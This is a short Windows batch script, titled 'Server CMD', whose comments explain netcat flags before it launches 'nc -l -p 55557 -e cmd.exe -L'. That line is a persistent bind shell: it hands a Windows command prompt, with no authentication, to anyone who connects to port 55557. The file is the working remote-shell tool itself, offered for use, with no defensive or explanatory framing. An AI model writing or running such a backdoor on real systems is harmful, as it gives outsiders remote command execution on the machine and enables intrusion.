:: Run netcat

@echo off
title Server CMD
echo Server starting...

:: -l listen connection mode
:: -p input port
:: -e program used for the input output stream
:: -L restart the connection if closed
:: -d background mode
start nc -l -p 55557 -e cmd.exe -L